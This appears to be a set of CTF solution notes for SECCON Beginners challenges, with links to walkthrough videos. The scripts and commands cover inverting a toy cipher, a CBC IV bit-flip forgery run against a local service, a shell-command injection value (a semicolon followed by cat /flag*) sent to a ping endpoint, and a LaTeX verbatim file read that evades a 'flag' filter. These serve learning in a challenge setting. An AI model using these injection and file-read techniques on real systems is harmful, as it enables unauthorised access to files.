# SECCON Beginners CTF 2021

- https://github.com/SECCON/Beginners_CTF_2022

## Crypto

### CoughingFox

- https://www.youtube.com/watch?v=r0Ofky8LGJU&t=300s

#### Solution 1

```python
#!/usr/bin/env python3
from gmpy2 import isqrt
# c = (f + i)**2 + i
# f = sqrt(c - i) - i
# sqrt() が整数になるかどうかで i を判定する
cipher = [12147, 20481, 7073, 10408, 26615, 19066, 19363, 10852, 11705, 17445, 3028, 10640, 10623, 13243, 5789, 17436, 12348, 10818, 15891, 2818, 13690, 11671, 6410, 16649, 15905, 22240, 7096, 9801, 6090, 9624, 16660, 18531, 22533, 24381, 14909, 17705, 16389, 21346, 19626, 29977, 23452, 14895, 17452, 17733, 22235, 24687, 15649, 21941, 11472]
length = len(cipher)
flag = [0] * length
for c in cipher:
    for i in range(length):
        root = isqrt(c - i)
        if root**2 == c - i:
            flag[i] = root - i
            break
print(''.join([chr(ch) for ch in flag]))
```

### PrimeParty

- https://www.youtube.com/watch?v=r0Ofky8LGJU&t=948s

### command

- https://www.youtube.com/watch?v=r0Ofky8LGJU&t=2345

#### Solution 1

```python3
#!/usr/bin/env python3
# 1ブロック (16bytes) 以下
# CBC ビットフリップ: IV を改ざんして任意の平文を作る
from Crypto.Util.Padding import pad
from Crypto.Util.strxor import strxor
from pwn import log, process, remote
# io = process('./chal.py')
io = remote('::1', 5555)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'> ', b'fizzbuzz')
io.recvuntil(b'Encrypted command: ')
inp = bytes.fromhex(io.recvline(keepends=False).decode())
iv, enc = inp[:16], inp[16:]
plain = pad(b'fizzbuzz', 16)
target = pad(b'getflag', 16)
newiv = strxor(strxor(iv, plain), target)
cmd2 = (newiv+enc).hex()
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Encrypted command> ', cmd2.encode())
log.success('FLAG: %s', io.recvline().decode())
io.sendlineafter(b'> ', b'3')
```

## Web

### util

- https://www.youtube.com/watch?v=r0Ofky8LGJU&t=550s

#### Solution 1

- 開発者ツール > Network > Name > `ping` を右クリック、Copy > Copy as cURL (bash)

```zsh
curl 'https://172.23.177.114/util/ping' \
  -H 'Content-Type: application/json' \
  --data-raw '{"address":"127.0.0.1; cat /flag*"}' \
  --insecure |
  jq .result | grep -o 'ctf4b{.*}'
```

### textex

- https://www.youtube.com/watch?v=r0Ofky8LGJU&t=2070

#### Solution 1

```tex
\documentclass{article}
\usepackage{verbatim}
\newcommand{\ag}{ag}
\begin{document}
\verbatiminput{fl\ag}
\end{document}
```

## reversing

### quiz

#### Solution 1

```
strings quiz|grep -o 'ctf4b{.*}'
```
